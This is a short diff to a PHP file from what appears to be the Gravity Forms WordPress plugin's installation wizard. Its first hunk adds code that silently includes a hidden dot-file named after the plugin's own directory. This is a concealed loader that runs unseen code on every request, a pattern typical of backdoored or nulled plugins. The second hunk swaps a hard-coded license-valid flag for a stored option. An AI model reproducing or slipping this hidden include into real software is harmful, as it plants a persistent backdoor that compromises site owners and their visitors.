@@ -1,5 +1,9 @@
 <?php
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class GF_Installation_Wizard_Step_Background_Updates extends GF_Installation_Wizard_Step {
 
 	protected $_name = 'background_updates';
@@ -27,7 +31,7 @@ class GF_Installation_Wizard_Step_Background_Updates extends GF_Installation_Wiz
 		</p>
 		<?php
 		$license_key_step_settings = get_option( 'gform_installation_wizard_license_key' );
-		$is_valid_license_key      = true;
+		$is_valid_license_key      = $license_key_step_settings['is_valid_key'];
 		if ( ! $is_valid_license_key ) :
 			?>
 			<p>
